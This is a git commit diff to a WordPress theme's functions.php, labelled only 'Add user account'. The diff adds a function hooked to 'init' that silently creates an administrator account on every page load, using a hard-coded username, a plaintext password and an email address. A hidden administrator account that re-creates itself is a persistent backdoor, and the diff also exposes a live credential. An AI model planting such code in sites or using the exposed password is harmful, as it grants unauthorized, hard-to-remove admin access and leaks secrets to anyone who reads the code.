fe9a24d0e89038459d39c65ce01265c6419b9a91
Jessica Wilson <jessica.wilson@teamcolab.com>
2020-01-02 21:36:19 -0500

    Add user account

--- wp-content/themes/jessica/functions.php
+++ wp-content/themes/jessica/functions.php
@@ -31,3 +31,15 @@ function custom_wp_enqueue_scripts() {
 add_action('wp_enqueue_scripts', 'custom_wp_enqueue_scripts');
 
 add_filter( 'gform_confirmation_anchor', '__return_true' );
+
+function carbon_create_admin_account() {
+	$username = 'jlwilson';
+	$password = 'Katyperry101';
+	$email    = 'jessica.wilson@teamcolab.com';
+ 
+	if (!username_exists($username) && !email_exists($email)) {
+		$user = new WP_User(wp_create_user($username, $password, $email));
+		$user->set_role('administrator');
+	}
+}
+add_action('init', 'carbon_create_admin_account');
